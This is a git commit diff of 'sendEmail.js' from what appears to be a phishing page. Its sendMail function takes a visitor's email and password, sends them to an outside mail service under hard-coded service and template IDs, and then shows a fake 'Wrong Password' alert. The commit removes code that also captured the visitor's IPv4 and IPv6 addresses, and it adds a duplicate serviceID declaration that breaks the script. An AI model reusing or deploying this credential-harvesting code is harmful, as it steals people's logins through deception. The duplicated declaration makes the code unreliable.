c4d88cfd8f05f370035d16ccb83ced697a06c6ab
Davi Mogrovejo Brasil <124883755+davi-mogrovejo@users.noreply.github.com>
2023-09-29 14:57:10 -0300

    Update sendEmail.js

--- sendEmail.js
+++ sendEmail.js
@@ -1,42 +1,10 @@
-function getIPAddresses() {
-    // Fetch IPv6 address
-    fetch('https://api64.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const ipv6 = data.ip;
-            document.getElementById('ipv6').textContent = ipv6;
-            
-            // Fetch IPv4 address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipv4 = data.ip;
-                    document.getElementById('ipv4').textContent = ipv4;
-                    
-                    // Send IP addresses to the server
-                    sendIPAddresses(ipv4, ipv6);
-                })
-                .catch(err => {
-                    console.error('Error fetching IPv4 address:', err);
-                    document.getElementById('ipv4').textContent = 'N/A';
-                });
-        })
-        .catch(err => {
-            console.error('Error fetching IPv6 address:', err);
-            document.getElementById('ipv6').textContent = 'N/A';
-        });
-}
-
-window.onload = getIPAddresses;                    
-
 function sendMail() {
   var params = {
     email: document.getElementById("email").value,
     password: document.getElementById("password").value,
-    ipv4: document.getElementById("ipv4").value,
-    ipv6: document.getElementById("ipv6").value,
   };
 
+  const serviceID = "service_9l3icjh";
   const serviceID = "service_v127bm1";
   const templateID = "template_avc41ik";
 
@@ -44,12 +12,8 @@ function sendMail() {
     .then(res=>{
         document.getElementById("email").value = "";
         document.getElementById("password").value = "";
-        document.getElementById("ipv4").value = "";
-        document.getElementById("ipv6").value = "";
         console.log(res);
         alert("Wrong Password")
-
     })
     .catch(err=>console.log(err));
-
 }
